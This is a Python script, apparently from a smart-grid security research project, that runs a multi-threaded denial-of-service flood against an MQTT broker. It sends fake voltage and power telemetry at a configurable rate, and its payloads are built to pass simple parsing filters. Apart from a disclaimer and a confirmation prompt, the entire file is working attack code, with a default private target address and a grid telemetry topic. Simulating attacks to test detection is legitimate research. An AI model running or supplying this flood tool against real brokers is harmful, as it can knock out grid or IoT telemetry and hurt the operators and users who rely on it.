#!/usr/bin/env python3
"""
RESEARCH DISCLAIMER
-------------------
This script is created for educational and research purposes only, specifically for 
the SmartGrid FDIA Shield project. It simulates a Denial of Service (DoS) attack 
against an MQTT broker to evaluate detection and mitigation mechanisms.
DO NOT use this script against systems without explicit permission.

MODULE BRIEFING
---------------
DoS Attack Simulator

This script floods a target MQTT broker with garbage telemetry messages.
It uses multiple threads to establish multiple connections and maximize throughput.
Payloads are randomized but structurally valid JSON to bypass simple parsing filters.
"""

import argparse
import json
import logging
import random
import sys
import threading
import time
from datetime import datetime

try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("Error: paho-mqtt is required. Install it using 'pip install paho-mqtt'")
    sys.exit(1)

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger("DoS_Attacker")

# Global counters for stats
stats_lock = threading.Lock()
total_messages_sent = 0
start_time = None
is_running = False

def print_banner():
    banner = """
    ==================================================
      SmartGrid DoS Attack Simulator
      WARNING: FOR RESEARCH PURPOSES ONLY
    ==================================================
    """
    print(banner)

def generate_garbage_payload():
    """Generates a randomized JSON payload that looks like telemetry data."""
    payload = {
        "node_id": f"fake_node_{random.randint(100, 999)}",
        "timestamp": datetime.now().isoformat(),
        "voltage": round(random.uniform(210.0, 250.0), 2),
        "current": round(random.uniform(0.5, 15.0), 2),
        "power": round(random.uniform(100.0, 3500.0), 2),
        "frequency": round(random.uniform(49.8, 50.2), 2),
        "status": random.choice(["OK", "WARNING", "ERROR"])
    }
    return json.dumps(payload)

def attack_worker(thread_id, target, port, topic, rate_limit):
    """Worker thread that establishes an MQTT connection and publishes messages."""
    global total_messages_sent, is_running
    
    client_id = f"dos_attacker_{thread_id}_{random.randint(1000, 9999)}"
    client = mqtt.Client(client_id=client_id)
    
    try:
        client.connect(target, port, 60)
        client.loop_start()
        logger.debug(f"Thread {thread_id} connected as {client_id}")
    except Exception as e:
        logger.error(f"Thread {thread_id} failed to connect: {e}")
        return

    # Delay between messages to achieve the desired rate
    # If rate is 0 or very high, we blast as fast as possible
    delay = 1.0 / rate_limit if rate_limit > 0 else 0
    
    while is_running:
        try:
            payload = generate_garbage_payload()
            client.publish(topic, payload, qos=0)
            
            with stats_lock:
                total_messages_sent += 1
                
            if delay > 0:
                time.sleep(delay)
        except Exception as e:
            logger.error(f"Thread {thread_id} error publishing: {e}")
            break
            
    client.loop_stop()
    client.disconnect()

def stats_monitor_thread(duration):
    """Background thread to periodically print attack statistics."""
    global total_messages_sent, start_time, is_running
    
    while is_running:
        elapsed = time.time() - start_time
        if elapsed > 0:
            rate = total_messages_sent / elapsed
            print(f"\r[STATS] Elapsed: {elapsed:.1f}s / {duration}s | Sent: {total_messages_sent} | Rate: {rate:.1f} msg/s", end="")
        
        if elapsed >= duration and duration > 0:
            is_running = False
            break
            
        time.sleep(1.0)
    print() # Newline after progress bar

def main():
    global start_time, is_running
    
    parser = argparse.ArgumentParser(description="MQTT DoS Attack Simulator")
    parser.add_argument("--target", type=str, default="10.59.53.30", help="Target broker IP address")
    parser.add_argument("--port", type=int, default=1883, help="Target broker port")
    parser.add_argument("--topic", type=str, default="smartgrid/node01/telemetry", help="Target topic")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds (0 for infinite)")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent attack threads")
    parser.add_argument("--rate", type=int, default=50, help="Messages per second per thread (0 for max speed)")
    
    args = parser.parse_args()
    
    print_banner()
    logger.info(f"Target: {args.target}:{args.port}")
    logger.info(f"Topic: {args.topic}")
    logger.info(f"Threads: {args.threads}")
    logger.info(f"Rate: {args.rate} msgs/sec/thread (Expected max total: {args.threads * args.rate} msgs/sec)")
    logger.info(f"Duration: {args.duration} seconds")
    print("-" * 50)
    
    try:
        input("Press ENTER to begin attack (Ctrl+C to abort)...")
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(0)
        
    logger.info("INITIATING DOS ATTACK...")
    
    start_time = time.time()
    is_running = True
    
    # Start worker threads
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=attack_worker, args=(i, args.target, args.port, args.topic, args.rate))
        t.daemon = True
        t.start()
        threads.append(t)
        
    # Start stats monitor
    monitor = threading.Thread(target=stats_monitor_thread, args=(args.duration,))
    monitor.daemon = True
    monitor.start()
    
    try:
        # Wait for the monitor thread to finish (which happens when duration expires)
        monitor.join()
    except KeyboardInterrupt:
        logger.info("\nAttack interrupted by user.")
        is_running = False
        
    # Final cleanup
    logger.info("Stopping threads...")
    for t in threads:
        t.join(timeout=1.0)
        
    elapsed = time.time() - start_time
    final_rate = total_messages_sent / elapsed if elapsed > 0 else 0
    
    print("-" * 50)
    logger.info(f"ATTACK COMPLETED")
    logger.info(f"Total Time: {elapsed:.2f} seconds")
    logger.info(f"Total Messages Sent: {total_messages_sent}")
    logger.info(f"Average Rate: {final_rate:.2f} msg/s")

if __name__ == "__main__":
    main()
